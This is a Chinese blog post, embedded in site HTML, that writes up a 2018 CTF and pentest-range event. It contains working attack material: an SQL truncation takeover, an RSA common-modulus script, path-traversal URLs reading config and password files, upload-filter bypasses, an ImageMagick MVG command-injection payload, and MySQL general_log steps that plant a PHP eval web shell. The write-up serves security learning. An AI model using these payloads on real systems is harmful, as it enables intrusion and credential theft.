@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="比赛是ctf+靶场 靶场大概也算web 内网渗透之类的">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="巅峰极客第二场wp">
+<meta property="og:url" content="http://Merl1ng.com/2018/08/28/巅峰极客第二场wp/index.html">
+<meta property="og:site_name" content="Merl1ng's blog">
+<meta property="og:description" content="比赛是ctf+靶场 靶场大概也算web 内网渗透之类的">
+<meta property="og:updated_time" content="2018-08-28T11:35:41.882Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="巅峰极客第二场wp">
+<meta name="twitter:description" content="比赛是ctf+靶场 靶场大概也算web 内网渗透之类的">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://Merl1ng.com/2018/08/28/巅峰极客第二场wp/"/>
+
+
+
+
+
+  <title>巅峰极客第二场wp | Merl1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Merl1ng's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/08/28/巅峰极客第二场wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Merl1ng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Merl1ng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">巅峰极客第二场wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-28T14:44:15+08:00">
+                2018-08-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>比赛是ctf+靶场 靶场大概也算web 内网渗透之类的<br><a id="more"></a></p>
+<h3 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h3><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>题目直接说了sql注入 一个注册页面 一个登陆页面</p>
+<p>首先简单测试一下 随便注册个账号 登陆说你不是admin拿不到flag</p>
+<p>去注册admin说该用户已存在</p>
+<p>这里我先测试了每个参数是否存在注入点 然后都gg</p>
+<p>登陆页面没回显信息 注册页面也没多余的信息 应该也不是二次注入</p>
+<p>然后想到了万能密码登陆 username=admin’ or 1#&amp;password=1 之类的</p>
+<p>试了试也都不行</p>
+<p>又想到了mysql字符编码的操作 比如 admin%c2之类的 还不行<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
+<p>那应该就是那个截断的操作了</p>
+<p>去注册 </p>
+<p><code>admin                                                                                     1</code>                                                                                                                                                                   </p>
+<p>空格后带不带东西应该都行</p>
+<p>重置admin的密码 然后用 admin 登陆即可 </p>
+<p>这玩意也第三次见了</p>
+<h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><p>n1 n2 一样 e1 e2 不同 c1 c2 不同</p>
+<p>rsa的共模攻击</p>
+<p>给的是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQEAiYmjmJiEVrP+9Katht88</div><div class="line">mVd/iXgEjeVDa+/DDY2MlJWJEqpSb/MztmhXMG67jeNsLDlqhO/cXTglAtqho/O2</div><div class="line">6XUC0uMchJMw9bTJUlehSal/WVTq+JNBFHrc3U6VD/904wu+Yih2tC7qyG30rZcV</div><div class="line">0FtWBKqBeUJMfZrEa9a18yKytXKLoUhwSiWo78wefITqflzj4BcD8E+UpDHZlUvX</div><div class="line">rix91uh5s1+KLUpe++c3JXv5m9nuZrFa/yM/x3tVikh9pZUvviuSPanF60Z4jAUD</div><div class="line">Nrfjal7YLVwbKusORb7kBcvnJIHbJWiqgp7qyH0gGlqP9e5vC+OBkqsoOWNfbGZC</div><div class="line">FwICCR0=</div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure>
+<p>这种公钥格式的 openssl跑一下拿到 n 和 e</p>
+<p>openssl rsa -in public.key -pubin -noout -text -modulus</p>
+<p>这里python也行 不过那个库 windows我安装老报错 ubuntu下就没事</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">  </div><div class="line">from Crypto.PublicKey import RSA</div><div class="line"></div><div class="line">with open(‘./pubkey2.pem’, ‘r’) as f:</div><div class="line"></div><div class="line">     key = RSA.importKey(f)</div><div class="line"></div><div class="line">     n = key.n</div><div class="line"></div><div class="line">     e = key.e</div><div class="line"></div><div class="line"><span class="built_in">print</span> n</div><div class="line"></div><div class="line"><span class="built_in">print</span> e</div></pre></td></tr></table></figure>
+<p>然后这里有个坑点 密文c1 c2 不是16进制格式的 长得比较像base64</p>
+<p>但我解了下发现是乱码 就没解base64直接转hex了 然后怎么都算不出来。。。</p>
+<p>这里当时智障了 因为乱不乱码根本没影响 反正都要转hex的 乱码知识ascii乱而已。。。</p>
+<p>所以就是普通的脚本加个base64解码就能跑了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"></div><div class="line">import gmpy2</div><div class="line">import libnum</div><div class="line">import base64</div><div class="line"></div><div class="line">n = 0x8989A398988456B3FEF4A6AD86DF3C99577F8978048DE5436BEFC30D8D8C94958912AA526FF333B66857306EBB8DE36C2C396A84EFDC5D382502DAA1A3F3B6E97502D2E31C849330F5B4C95257A149A97F5954EAF89341147ADCDD4E950FFF74E30BBE622876B42EEAC86DF4AD9715D05B5604AA8179424C7D9AC46BD6B5F322B2B5728BA148704A25A8EFCC1E7C84EA7E5CE3E01703F04F94A431D9954BD7AE2C7DD6E879B35F8A2D4A5EFBE737257BF99BD9EE66B15AFF233FC77B558A487DA5952FBE2B923DA9C5EB46788C050336B7E36A5ED82D5C1B2AEB0E45BEE405CBE72481DB2568AA829EEAC87D201A5A8FF5EE6F0BE38192AB2839635F6C664217</div><div class="line">e1 = 0x91d</div><div class="line">e2 = 0x5b25</div><div class="line">c1 = int(base64.b64decode(open(<span class="string">'flag1.enc'</span>,<span class="string">'rb'</span>).read()).encode(<span class="string">'hex'</span>),16)</div><div class="line">c2 = int(base64.b64decode(open(<span class="string">'flag2.enc'</span>,<span class="string">'rb'</span>).read()).encode(<span class="string">'hex'</span>),16)</div><div class="line"></div><div class="line">def common_modulus(n, e1, e2, c1, c2):</div><div class="line">    <span class="string">""</span><span class="string">"</span></div><div class="line">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</div><div class="line">    ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1</div><div class="line">    ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</div><div class="line">    "<span class="string">""</span></div><div class="line">    assert (libnum.gcd(e1, e2) == 1)</div><div class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</div><div class="line">    <span class="comment"># 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。</span></div><div class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; 0 <span class="keyword">else</span> pow(gmpy2.invert(c1, n), <span class="_">-s</span>1, n)</div><div class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; 0 <span class="keyword">else</span> pow(gmpy2.invert(c2, n), <span class="_">-s</span>2, n)</div><div class="line">    <span class="built_in">return</span> m % n</div><div class="line"></div><div class="line">flag = common_modulus(n, e1, e2, c1, c2)</div><div class="line">flag = libnum.n2s(flag)</div><div class="line"><span class="built_in">print</span> flag</div></pre></td></tr></table></figure>
+<p><strong>libnum.n2s</strong>确实挺方便的 以前不知道 hex(msg)[2:].decode(‘hex’) 就很麻烦<br>详细可以看<br><a href="https://blog.csdn.net/qq_33438733/article/details/79297527" target="_blank" rel="external">https://blog.csdn.net/qq_33438733/article/details/79297527</a></p>
+<p>还有学到了几个python小技巧</p>
+<p>from xx impoet * 比 import xx 在使用时不用 xx.ways 可以直接ways </p>
+<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><p>word 改成zip一个一个翻就行</p>
+<p>后来见有师傅word中光标移到flag后面 此时字体会直接显示</p>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p>参考<br><a href="http://120.79.189.7/?p=479" target="_blank" rel="external">http://120.79.189.7/?p=479</a><br><a href="https://www.o2oxy.cn/1749.html" target="_blank" rel="external">https://www.o2oxy.cn/1749.html</a><br><a href="https://mp.weixin.qq.com/s/ivQLNSCMaH-zXrAqBUEiCg" target="_blank" rel="external">https://mp.weixin.qq.com/s/ivQLNSCMaH-zXrAqBUEiCg</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzIyNTI0ODcwMw==&amp;mid=2662123198&amp;idx=1&amp;sn=d21c18a4656838e593055a969ec355c3&amp;chksm=f35af26ec42d7b7878a6958e0d43d889cd79182942352f50f5f1dac09942a62487d506f652c3&amp;mpshare=1&amp;scene=23&amp;srcid=0828DsBqxPSECrP6NQf7qpf7#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzIyNTI0ODcwMw==&amp;mid=2662123198&amp;idx=1&amp;sn=d21c18a4656838e593055a969ec355c3&amp;chksm=f35af26ec42d7b7878a6958e0d43d889cd79182942352f50f5f1dac09942a62487d506f652c3&amp;mpshare=1&amp;scene=23&amp;srcid=0828DsBqxPSECrP6NQf7qpf7#rd</a></p>
+<h4 id="抛转引玉"><a href="#抛转引玉" class="headerlink" title="抛转引玉"></a>抛转引玉</h4><p>扫描了一下有一个www.zip </p>
+<p>然后打开一下 ，找到<strong>config.php</strong> 发现题目的root 密码 </p>
+<p>然后发现是PHPOA，然后wooyun搜下phpoa有任意文件下载，直接下载config.php即可<br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-063280.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-063280.html</a></p>
+<p>这里师傅的吐槽真是23333</p>
+<p>/down.php?urls=data/../config.php</p>
+<p>可以拿到nyoa的密码（问题2）</p>
+<p>问题三应该是个sql </p>
+<h4 id="暗渡陈仓"><a href="#暗渡陈仓" class="headerlink" title="暗渡陈仓"></a>暗渡陈仓</h4><p>虚实相接，需要出题者以声东击西的招式准备的歧路，找到正确的栈道。</p>
+<p>1.提交上传点的地址的name(例如答:/xxxxx/)</p>
+<p>2.提交系统管理员Hack用户的全名</p>
+<p>3.超级管理员用户桌面根目录admin.txt文件的内容</p>
+<p>AVWS扫描 获取到上传的点 /u-Are-Admin/u-upload-file/</p>
+<p>这里不扫也能发现目录:</p>
+<p>右键查看源代码发现图片路径是u-Are-Admin 然后用任意读取downloadfile.php?file=读download.php发现路径是u-uploads-file</p>
+<p>上传php 不行 大小写绕过 PHP 或者 phP</p>
+<p>拿到shell后 net user</p>
+<p>发现hack 全名是Hacked356  </p>
+<p>getshell后发现为最高权限，直接菜刀找到 <code>c:\documents and sttings\administrator\桌面\admin.txt</code>，读取即可</p>
+<h4 id="瞒天过海"><a href="#瞒天过海" class="headerlink" title="瞒天过海"></a>瞒天过海</h4><p>目的不是为了瞒天，只是做出题目的一种手段。</p>
+<p>1.提交后台管理员密码</p>
+<p>2.提交mysql密码</p>
+<p>3.提交C盘根目录password.txt内容</p>
+<p>注入拿到后台管理员密码</p>
+<p>再注入 读取mysql.user的password列，然后解hash</p>
+<p>再再注入利用load_file()可以读password.txt</p>
+<p>或者进入后台之后有上传 上传会自动加.jpg 发现有任意读取。直接读根目录password.txt</p>
+<p>/classes/downloadfile.php?file=../../../../../../../../../../../password.txt</p>
+<h4 id="偷梁换柱"><a href="#偷梁换柱" class="headerlink" title="偷梁换柱"></a>偷梁换柱</h4><p>赛题是那样无情残忍，无义无理取闹，稍有踟蹰，他就偷梁换柱。</p>
+<p>1.提交后台admin用户的密码</p>
+<p>2.提交系统管理员ichunqiu用户的全名</p>
+<p>3.提交/tmp/access.log的内容的前16位</p>
+<p>扫描发现存在/.git/目录，利用githack下载下来源码，源码中发现默认的sql文件，里面有账户密码</p>
+<p>然后发现文件上传 对照源码</p>
+<p>发现会自动加 png后缀 并且发现了ImageMagick</p>
+<p>所以这里有两条路</p>
+<p>先说第一种 直接上传绕过</p>
+<p>中文.jpg.png<br>3.jpg.png<br>3.png.png<br>3”.php.png<br>3’.php.png</p>
+<p>最终3.php.png或者3.php.png/.php可以</p>
+<p>第二种  ImageMagick</p>
+<pre><code>push graphic-context
+
+viewbox 0 0 640 480
+
+fill ‘url(https://xxxxxx/1.jpg”|ls &gt; /var/www/html/1.txt”)’
+
+pop graphic-context
+</code></pre><p>就可以执行任意命令 然后分别读取/etc/passwd  和  /tmp/access.log</p>
+<h4 id="反客为主"><a href="#反客为主" class="headerlink" title="反客为主"></a>反客为主</h4><p>以静谋动，反客为主，掌握真正的大权，才能不任人摆布。</p>
+<p>1.提交phpStudy目录下Documents.txt的内容</p>
+<p>2.提交系统用户/ichunqiu的密码</p>
+<p>3.提交ichunqiu用户Desktop根目录password.txt的内容</p>
+<p>发现有任意读取info/include.php?filename=../../../../../../../../../../windows/win.ini</p>
+<p>info/include.php?filename=../../../../../../../../../../windows/info.txt</p>
+<p>虽然用不到。。</p>
+<p>然后扫目录发现phpmyadmin服务，用弱口令root/root登进去，然后genernal log getshell。</p>
+<p>这种方法sctf考过</p>
+<pre><code>show variables like ‘%general%’;  #查看配置
+
+set global general_log = on;  #开启general log模式
+
+set global general_log_file = ‘C:/phpStudy/WWW/1.php’;   #设置日志目录为shell地址
+
+select ‘&lt;?php eval($_POST[cmd]);?&gt;’;  #写入shell
+</code></pre><p>进去传QuarksPwDump 可以跑出HASH cmd5解密得到密码</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/20/网鼎杯wp/" rel="prev" title="网鼎杯wp">
+                网鼎杯wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Merl1ng" />
+          <p class="site-author-name" itemprop="name">Merl1ng</p>
+           
+              <p class="site-description motion-element" itemprop="description">Love life , love gakki !</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">70</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Merl1ng" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/Merl1ng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf"><span class="nav-number">1.</span> <span class="nav-text">ctf</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web"><span class="nav-number">1.1.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#crypto"><span class="nav-number">1.2.</span> <span class="nav-text">crypto</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc"><span class="nav-number">1.3.</span> <span class="nav-text">misc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶场"><span class="nav-number">2.</span> <span class="nav-text">靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#抛转引玉"><span class="nav-number">2.1.</span> <span class="nav-text">抛转引玉</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#暗渡陈仓"><span class="nav-number">2.2.</span> <span class="nav-text">暗渡陈仓</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#瞒天过海"><span class="nav-number">2.3.</span> <span class="nav-text">瞒天过海</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#偷梁换柱"><span class="nav-number">2.4.</span> <span class="nav-text">偷梁换柱</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反客为主"><span class="nav-number">2.5.</span> <span class="nav-text">反客为主</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Merl1ng</span>
+</div>
+
+
+<div class="powered-by">
+   Love life 
+</div>
+
+<div class="theme-info">
+  Love gakki 
+  
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
